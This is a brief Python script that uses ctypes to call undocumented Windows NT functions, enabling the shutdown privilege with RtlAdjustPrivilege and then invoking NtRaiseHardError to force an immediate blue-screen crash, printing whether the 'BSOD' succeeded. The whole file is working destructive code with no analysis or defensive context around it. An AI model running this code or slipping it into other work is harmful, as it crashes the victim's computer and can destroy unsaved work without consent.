import ctypes
ntdll = ctypes.windll.ntdll
prev_value = ctypes.c_bool()
res = ctypes.c_ulong()
ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
    print("BSOD Successfull!")
else:
    print("BSOD Failed...")